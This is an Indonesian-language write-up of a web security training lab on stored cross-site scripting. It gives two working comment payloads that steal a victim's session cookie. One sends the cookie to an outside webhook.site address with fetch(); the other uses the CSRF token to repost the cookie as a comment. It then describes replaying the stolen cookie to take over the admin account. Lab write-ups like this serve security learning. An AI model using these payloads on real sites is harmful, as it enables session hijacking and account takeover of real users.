# Exploiting cross-site scripting to steal cookies

Lab ini berisi kerentanan **Stored XSS** pada fitur komentar blog. Ada pengguna korban yang disimulasikan dan akan melihat semua komentar setelah diposting.

Untuk menyelesaikan lab ini, kamu harus mengeksploitasi kerentanan tersebut untuk **mencuri (exfiltrate) cookie sesi korban**, lalu menggunakan cookie itu untuk **menyamar sebagai korban (impersonation)**.

> Untuk mencegah platform Academy digunakan menyerang sistem eksternal, firewall kami memblokir interaksi antara lab dan sistem luar sembarangan. Jadi untuk menyelesaikan lab, kamu harus menggunakan server publik default dari **Burp Collaborator**.
> Beberapa pengguna mungkin akan menyadari bahwa ada solusi alternatif untuk lab ini yang tidak memerlukan Burp Collaborator. Namun solusi itu jauh lebih “kasar” dan kurang elegan dibandingkan teknik pencurian cookie.


## Solusi

Disni kita tidak menggunakn **Burp Collaborator** karena keterbatasan burp comunnity.

1. Menggunakan situs [webhook.site](https://webhook.site/).

2. Copy url dari webhook site (`https://webhook.site/<ID_WEBHOOK_SITE>`).

3. Kirim payload berikut di komentar blog, lalu ganti bagian **ID_WEBHOOK_SITE** dengan ID dari webhooksite:

```html
<script>
fetch('https://webhook.site/<ID_WEBHOOK_SITE>', {
method: 'POST',
mode: 'no-cors',
body: document.cookie
});
</script>
```

Script ini akan membuat siapa pun yang melihat komentar tersebut mengirim request `POST` berisi cookie mereka ke webhooksite.

4. Kembali ke tab webhooksite,Kamu akan melihat adanya HTTP interaction. Jika belum muncul, tunggu beberapa detik lalu coba lagi.

5. Catat nilai cookie milik korban yang ada di body POST tersebut.

`session=iRarR0kLgthuWutrXURnDWbFgXBZJd9S`

6. Reload halaman blog utama , lalu ganti cookie sesi kamu dengan cookie yang sudah kamu ambil dari webhooksite.

7. Kirim request tersebut untuk menyelesaikan lab.

8. Untuk membuktikan bahwa kamu berhasil mengambil alih sesi admin, gunakan cookie itu pada request ke `/my-account` untuk membuka halaman akun admin.

## Solusi alternatif


1. Masukkan paylod berikut ke bagian omentar di postingan `3`,

```html
<script>

	var csrf_value;

	/*Define the request that will obtain the CSRF token value*/

	var req = new XMLHttpRequest();
	req.onreadystatechange = function() {

	/*Define the code that will execute if the CSRF token GET request is successful*/

	if (req.readyState == 4 && req.status == 200)
	{
		/*From the request made, filter the response to obtain the CSRF token value*/

		var htmlPage = req.responseXML;
		csrf_value = htmlPage.getElementsByName("csrf")[0].value;

		/*Define the function that will execute when the first request is successful and we have the CSRF token value*/

		function postComment(csrf_value) {

			/*Define the different values belonging to the comment publication request*/
			var postId_value = '4';
			var comment_value = document.cookie;
			var name_value = 'TESTING123';
			var email_value = 'testes@email.com';
			var website_value = 'http://testing.com';

			var url = '/post/comment';

			/*Define and send the second request that the code will make, the request that publishes comments*/
			var req2 = new XMLHttpRequest();
			req2.open('POST', url, true);
			req2.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
			req2.send('csrf=' + csrf_value + '&postId=' + postId_value + '&comment=' + comment_value + '&name=' + name_value + '&email=' + email_value + '&website=' + website_value);

		}

		postComment(csrf_value);

	}

	};

	/*Finish defining the request that will obtain the CSRF token, it will be the first request made*/

	req.open("GET", "/post?postId=3");
	req.responseType = "document";
	req.send();

</script>
```

Penjelasan kode singkat: Pertama, kita membuat permintaan menggunakan XMLHttpRequest ke `/post?postId=3` untuk mendapatkan nilai token CSRF.

Setelah kita mendapatkan token, kita cukup melakukan permintaan POST menggunakan XMLHttpRequest lagi agar komentar dipublikasikan saat kode ini dieksekusi.

Skrip ini akan disuntikkan ke postingan nomor `3`, tetapi komentar yang akan dipublikasikan dengan cookie akan masuk ke postingan nomor `4`. 


**Opsional :** Hapus jeda baris dari kode untuk menghindari kemungkinan masalah [CodeBeautify tool to remove line breaks](https://codebeautify.org/remove-line-breaks):
